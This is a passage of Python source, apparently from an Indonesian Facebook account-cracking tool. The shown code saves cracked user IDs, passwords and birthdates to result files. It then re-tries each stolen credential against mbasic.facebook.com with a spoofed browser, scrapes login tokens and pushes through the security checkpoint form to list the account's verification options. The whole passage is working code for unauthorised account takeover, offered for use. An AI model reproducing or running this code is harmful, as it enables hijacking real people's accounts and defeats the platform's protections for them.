				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
		else:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Derr")
		print("\r"+h+batas)

# CEK OPSI

def cek_opsi():
	loop = 0
	print("\n"+balmond+l+" Masukkan Nama File")
	print(balmond+l+" Contoh : "+k+"Hasil_Cp/CP_%s.txt"%(hck))
	inp = input(balmond+l+" Nama File : "+h)
	try:
		tes = open(inp,"r").readlines()
	except IOError:
		jalan("\n"+balmond+m+" File Tidak Ada")
		time.sleep(0.5)
		menu()
	print(balmond+l+" Terdapat : "+k+"%s Akun"%len(tes))
	print("")
	for cinta in tes:
		loop+=1
		sayang = cinta.replace("\n","")
		gemes = sayang.split(">")
		yaudah (gemes[0], gemes[1], loop, tes)

# GAK TAU

def yaudah(user,pasw,loop,tes):
	mb = ("https://mbasic.facebook.com")
	try:
		ua = open("user.txt","r").read()
	except (IOError,KeyError):
		ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
	ses = requests.Session()
	print(u+"\rʕ"+k+"CEK"+u+"ʔ "+p+"{%s} Dari {%s}"%(loop,len(tes)), end=' ');sys.stdout.flush()
	try:
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		data = {}
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies:
			print(u+"\rʕ"+h+"Ok"+u+"ʔ"+h+" "+user+k+" >< "+h+pasw)
			print(h+batas)
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			print(u+"\rʕ"+k+"Cp"+u+"ʔ"+b+" "+user+k+" >< "+l+pasw)
			for opt in range(len(ngew)):
				print("\r"+balmond+l+"   "+ngew[opt])
			if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Derr")
			print(h+batas)
		else:
			print(u+"\rʕ"+s+"X"+u+"ʔ"+m+" "+user+k+" >< "+m+pasw+"\n password dah diganti sma ownernya")
			print(h+batas)
	except requests.exceptions.ConnectionError:
		time.sleep(31)

if __name__ == '__main__':
#	os.system("git pull")
	menu()
